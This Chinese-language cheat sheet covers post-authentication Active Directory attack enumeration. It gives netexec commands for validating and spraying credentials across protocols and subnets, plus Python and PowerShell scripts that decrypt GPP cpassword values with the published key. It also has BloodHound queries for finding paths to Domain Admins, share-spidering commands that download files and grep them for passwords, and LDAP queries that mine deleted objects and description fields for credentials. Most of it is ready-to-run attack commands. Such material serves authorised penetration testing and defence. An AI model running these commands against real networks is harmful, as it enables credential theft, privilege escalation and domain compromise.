# 认证后深度枚举

## 多协议凭据验证

### 验证命令

```bash
# SMB 验证
netexec smb <DC_IP> -u '<USER>' -p '<PASSWORD>'

# LDAP 验证
netexec ldap <DC_IP> -u '<USER>' -p '<PASSWORD>'

# WinRM 验证
netexec winrm <DC_IP> -u '<USER>' -p '<PASSWORD>'

# MSSQL 验证
netexec mssql <DC_IP> -u '<USER>' -p '<PASSWORD>'

# RDP 验证
netexec rdp <DC_IP> -u '<USER>' -p '<PASSWORD>'
```

### 输出标志含义

- `[+]` = 凭证有效
- `[+] ... (Pwn3d!)` = 凭证有效 **且有管理员权限**
- `[-]` = 凭证无效或无访问权限

### 协议成功意味着什么权限

| 协议 | 成功意味着 | 攻击面 |
|------|-----------|--------|
| SMB `[+]` | 文件共享访问 | 读写共享、搜索敏感文件、GPP 密码 |
| SMB `(Pwn3d!)` | 本地管理员 | SAM dump、LSASS dump、远程执行、横向移动 |
| WinRM `[+]` | 远程命令执行 | 交互式 PowerShell、文件上传下载、持久化 |
| LDAP `[+]` | 目录查询权限 | 用户/组/ACL 枚举、BloodHound 收集、Kerberoasting |
| MSSQL `[+]` | 数据库访问 | 数据窃取、xp_cmdshell 执行命令、链接服务器跳转 |
| RDP `[+]` | GUI 远程桌面 | 交互式操作、浏览器凭据、桌面文件、剪贴板 |

### 凭据批量验证

```bash
# 密码在子网内批量验证
netexec smb <SUBNET>/24 -u '<USER>' -p '<PASSWORD>' --continue-on-success

# Hash 批量验证
netexec smb <SUBNET>/24 -u '<USER>' -H '<NT_HASH>' --continue-on-success

# 多协议交叉验证（同一凭据）
for proto in smb winrm ldap mssql rdp; do
  netexec $proto <DC_IP> -u '<USER>' -p '<PASSWORD>'
done
```

---

## GPP 密码发现

### 漏洞背景 (MS14-025)

Group Policy Preferences 允许管理员在组策略中嵌入凭据（本地账户、映射驱动器、计划任务等）。密码用 AES-256-CBC 加密，但微软在 MSDN 上**公开了加密密钥**，使加密形同虚设。

### 已发布的 AES-256 密钥

```
4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8
f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b
```

加密参数：AES-256-CBC / IV 全零 (16 null bytes) / PKCS7 填充 / UTF-16LE 编码 / Base64 输出。

### 漏洞文件路径

```
\\<DC>\SYSVOL\<DOMAIN>\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
\\<DC>\SYSVOL\<DOMAIN>\Policies\{GUID}\Machine\Preferences\Services\Services.xml
\\<DC>\SYSVOL\<DOMAIN>\Policies\{GUID}\Machine\Preferences\Scheduledtasks\Scheduledtasks.xml
\\<DC>\SYSVOL\<DOMAIN>\Policies\{GUID}\Machine\Preferences\DataSources\DataSources.xml
\\<DC>\SYSVOL\<DOMAIN>\Policies\{GUID}\Machine\Preferences\Printers\Printers.xml
\\<DC>\SYSVOL\<DOMAIN>\Policies\{GUID}\Machine\Preferences\Drives\Drives.xml
```

### Groups.xml 结构示例

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{312F64D0-5034-4530-9A25-2C5E9ABD2A83}">
  <User clsid="{19014E30-2C0B-4D47-975F-53C4D116D211}"
        name="local_admin"
        image="2"
        changed="2024-01-11 12:00:00"
        uid="{GUID}">
    <Properties action="C"
                userName="local_admin"
                cpassword="K7QxMZTcQCb6tcaUt149GOpteC5vdk1m9fclrVml/zA="/>
  </User>
</Groups>
```

### 自动发现

```bash
# netexec 一键搜索 + 解密
netexec smb <DC_IP> -u '<USER>' -p '<PASSWORD>' -M gpp_password

# 爬取 SYSVOL 搜索 XML
netexec smb <DC_IP> -u '<USER>' -p '<PASSWORD>' --spider 'SYSVOL' --pattern .xml
```

### gpp-decrypt 解密

```bash
# 标准用法
gpp-decrypt "K7QxMZTcQCb6tcaUt149GOpteC5vdk1m9fclrVml/zA="

# Kali 自带版本可能有 bug，备选:
# https://github.com/t0thkr1s/gpp-decrypt
```

### Python 解密脚本

```python
#!/usr/bin/env python3
from Crypto.Cipher import AES
import base64

def decrypt_cpassword(cpassword):
    key = bytes([
        0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9,
        0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8,
        0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90,
        0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b
    ])
    iv = b'\x00' * 16
    ciphertext = base64.b64decode(cpassword)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext)
    pad_len = plaintext[-1]
    plaintext = plaintext[:-pad_len]
    return plaintext.decode('utf-16-le')

cpassword = "K7QxMZTcQCb6tcaUt149GOpteC5vdk1m9fclrVml/zA="
print(decrypt_cpassword(cpassword))
```

### PowerShell 解密脚本

```powershell
function Decrypt-GPPPassword {
    param([string]$Cpassword)
    $Key = [byte[]](0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,
                    0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                    0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,
                    0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
    $IV = [byte[]]::new(16)
    $Aes = [System.Security.Cryptography.Aes]::Create()
    $Aes.Key = $Key; $Aes.IV = $IV
    $Aes.Mode = "CBC"; $Aes.Padding = "PKCS7"
    $Decryptor = $Aes.CreateDecryptor()
    $CipherBytes = [Convert]::FromBase64String($Cpassword)
    $PlainBytes = $Decryptor.TransformFinalBlock($CipherBytes, 0, $CipherBytes.Length)
    return [System.Text.Encoding]::Unicode.GetString($PlainBytes)
}
```

### 为什么现在仍然有效

1. MS14-025 补丁只阻止**新建** cpassword 条目，不删除已有文件
2. 没有自动清理机制
3. 管理员往往不知道暴露风险或怕破坏现有策略

---

## BloodHound 关键 Cypher 查询

### 数据收集

```bash
bloodhound-python -u '<USER>' -p '<PASSWORD>' \
  -d '<DOMAIN>' -dc '<DC_FQDN>' \
  -c All --zip
```

### 最短路径到 Domain Admins

```cypher
MATCH p=shortestPath(
  (u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
)
RETURN p
```

### Kerberoastable 用户

```cypher
MATCH (u:User)
WHERE u.hasspn=true AND u.enabled=true
RETURN u.name, u.serviceprincipalnames, u.pwdlastset, u.admincount
ORDER BY u.pwdlastset ASC
```

### 非约束委派主机

```cypher
MATCH (c:Computer {unconstraineddelegation:true})
WHERE c.enabled=true
RETURN c.name, c.operatingsystem
```

### 约束委派

```cypher
MATCH (u) WHERE u.allowedtodelegate IS NOT NULL AND u.enabled=true
RETURN u.name, u.allowedtodelegate
```

### LAPS 密码可读用户

```cypher
MATCH p=(u)-[:ReadLAPSPassword]->(c:Computer)
RETURN u.name, c.name
```

### DCSync 权限持有者

```cypher
MATCH p=()-[:DCSync|GetChanges|GetChangesAll]->(:Domain)
RETURN p
```

### 到高价值目标的所有路径

```cypher
MATCH p=shortestPath(
  (u:User {owned:true})-[*1..]->(t {highvalue:true})
)
WHERE u <> t
RETURN p
```

### 可 ASREPRoast 的用户

```cypher
MATCH (u:User {dontreqpreauth:true, enabled:true})
RETURN u.name, u.pwdlastset
```

---

## Share 枚举与 spider_plus 模块

### 基础共享列表

```bash
netexec smb <DC_IP> -u '<USER>' -p '<PASSWORD>' --shares
```

### 输出解读

| 权限 | 含义 |
|------|------|
| READ | 可以列出和读取文件 |
| WRITE | 可以创建和修改文件 |
| READ,WRITE | 完全访问 |

### 高价值共享

| 共享名 | 内容 |
|--------|------|
| SYSVOL | 组策略、脚本、GPP 文件 |
| NETLOGON | 登录脚本 |
| C$ | 管理共享（需要管理员） |
| 自定义共享 | Backups, Development, IT_Private 等 |

### spider_plus 递归内容发现

```bash
# 枚举所有可访问文件（JSON 输出）
netexec smb <DC_IP> -u '<USER>' -p '<PASSWORD>' -M spider_plus

# 查看结果
cat ~/.nxc/modules/nxc_spider_plus/<IP>.json

# 下载所有文件
netexec smb <DC_IP> -u '<USER>' -p '<PASSWORD>' -M spider_plus -o DOWNLOAD_FLAG=True

# 下载目录
ls ~/.nxc/modules/nxc_spider_plus/<IP>/
```

### 按模式搜索

```bash
# 搜索 PowerShell 脚本
netexec smb <DC_IP> -u '<USER>' -p '<PASSWORD>' --spider 'SYSVOL' --pattern .ps1

# 搜索配置文件
netexec smb <DC_IP> -u '<USER>' -p '<PASSWORD>' --spider 'SYSVOL' --pattern .xml

# 搜索文本文件
netexec smb <DC_IP> -u '<USER>' -p '<PASSWORD>' --spider 'NETLOGON' --pattern .txt
```

### 敏感文件模式

| 文件模式 | 可能包含的内容 |
|----------|---------------|
| *.ps1 | 带凭据的脚本 |
| *.bat | 带密码的批处理 |
| *.xml | 配置文件、GPP 密码 |
| *.config | 应用配置 |
| web.config | 数据库连接字符串 |
| Groups.xml | GPP cpassword |

### 下载后搜索

```bash
grep -ri "password" ~/.nxc/modules/nxc_spider_plus/<IP>/
grep -ri "cpassword" ~/.nxc/modules/nxc_spider_plus/<IP>/
grep -ri "credential" ~/.nxc/modules/nxc_spider_plus/<IP>/
```

---

## LDAP 高级查询

### Tombstone / 已删除对象枚举

**LDAP 控制 OID**: `1.2.840.113556.1.4.417` (LDAP_SERVER_SHOW_DELETED_OID)

```bash
# 查询已删除对象
ldapsearch -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' \
  -b 'DC=domain,DC=local' \
  -E '1.2.840.113556.1.4.417' \
  '(&(isDeleted=TRUE)(!(isRecycled=TRUE)))'

# 只返回关键属性
ldapsearch -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' \
  -b 'DC=domain,DC=local' \
  -E '1.2.840.113556.1.4.417' \
  '(&(isDeleted=TRUE)(!(isRecycled=TRUE)))' \
  distinguishedName whenCreated whenChanged lastKnownParent isDeleted objectClass objectGUID
```

### Tombstone 生命周期

1. **删除**: 对象标记为已删除，移入 CN=Deleted Objects
2. **Tombstone 状态**: 保留属性 180 天（TSL）
3. **回收站**: 若启用，完整属性保留更久
4. **垃圾回收**: 对象被永久移除

### 情报价值

- **幽灵管理员**: 最近删除的特权账户
- **遗留凭据**: 描述字段中的密码
- **SIDHistory**: 可能在 tombstone 对象中持续存在
- **账户恢复**: 潜在的已删除账户恢复攻击面

### 跨域 Global Catalog 查询

```bash
# 通过 Global Catalog (端口 3268) 进行森林级搜索
ldapsearch -H ldap://<DC_IP>:3268 -D '<USER>@<DOMAIN>' -w '<PASSWORD>' \
  -b 'DC=forest,DC=local' \
  "(objectClass=user)" sAMAccountName
```

Global Catalog 包含：
- 森林中所有对象的部分副本
- 单一查询点覆盖整个森林
- 适用于跨域枚举

### 跨域查询行为差异

**森林内部（父子信任）**:
```bash
# 从子域查询父域（可以成功）
ldapsearch -H ldap://<PARENT_DC> -D '<USER>@<CHILD_DOMAIN>' -w '<PASSWORD>' \
  -b 'DC=parent,DC=local' "*" | grep 'userPrincipalName:'
```
原因：森林内所有域共享传递信任，Authenticated Users 是森林级别的。

**森林外部（外部信任）**:
```bash
# 跨森林查询（会失败，返回 52e Invalid Credentials）
ldapsearch -H ldap://<EXTERNAL_DC> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' \
  -b 'DC=external,DC=local' "*"
```
原因：外部 DC 无法验证简单绑定凭据，需要 Kerberos 认证 + referral TGT。森林是最终安全边界。

### 常用 LDAP 过滤器速查

```
# 所有用户
(&(objectCategory=person)(objectClass=user))

# 仅启用的用户
(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))

# 有 SPN 的用户（Kerberoasting 目标）
(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))

# 禁用预认证的用户（ASREPRoasting 目标）
(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))

# Domain Admins 组成员
(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=local)

# 所有计算机
(objectCategory=computer)

# 描述字段搜索（可能包含密码）
(&(objectCategory=person)(objectClass=user)(description=*))
```

### 描述字段密码挖掘

```bash
ldapsearch -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' \
  -b 'DC=domain,DC=local' "*" | grep 'description:' -A3
```

`-A3` 的原因：AD 条目多行显示，描述可能跨行，密码信息有时在后续行中。
